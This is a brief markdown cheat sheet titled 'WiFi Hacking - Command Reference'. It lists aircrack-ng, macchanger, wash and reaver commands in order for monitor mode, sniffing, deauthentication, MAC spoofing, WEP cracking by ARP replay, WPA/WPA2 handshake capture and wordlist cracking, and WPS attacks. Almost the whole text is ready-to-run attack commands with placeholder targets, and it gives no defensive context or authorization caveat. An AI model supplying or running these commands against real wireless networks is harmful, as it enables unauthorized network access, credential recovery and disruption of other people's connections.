

# WiFi Hacking - Command Reference

## 1. Enable Monitor Mode
```bash
sudo su
airmon-ng start wlan0

2. Packet Sniffing

airodump-ng wlan0mon

3. Select Target

airodump-ng --bssid [Target-BSSID] --channel [CH] wlan0mon

4. Deauthentication Attack

aireplay-ng --deauth 30 -a [BSSID] wlan0mon

5. MAC Address Spoofing

ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up

6. Cracking WEP

1. Capture packets


2. Perform fake authentication:



aireplay-ng -1 0 -a [BSSID] -h [Your-MAC] wlan0mon

3. ARP Request Replay Attack:



aireplay-ng -3 -b [BSSID] -h [Your-MAC] wlan0mon

4. Crack captured IVs:



aircrack-ng capturefile.cap

7. Cracking WPA/WPA2

1. Capture handshake



airodump-ng --bssid [BSSID] --channel [CH] -w capture wlan0mon

2. Deauth client to capture handshake



aireplay-ng --deauth 5 -a [BSSID] wlan0mon

3. Crack with wordlist



aircrack-ng -w wordlist.txt -b [BSSID] capture-01.cap

8. WPS Attacks (If WPS is enabled)

wash -i wlan0mon
reaver -i wlan0mon
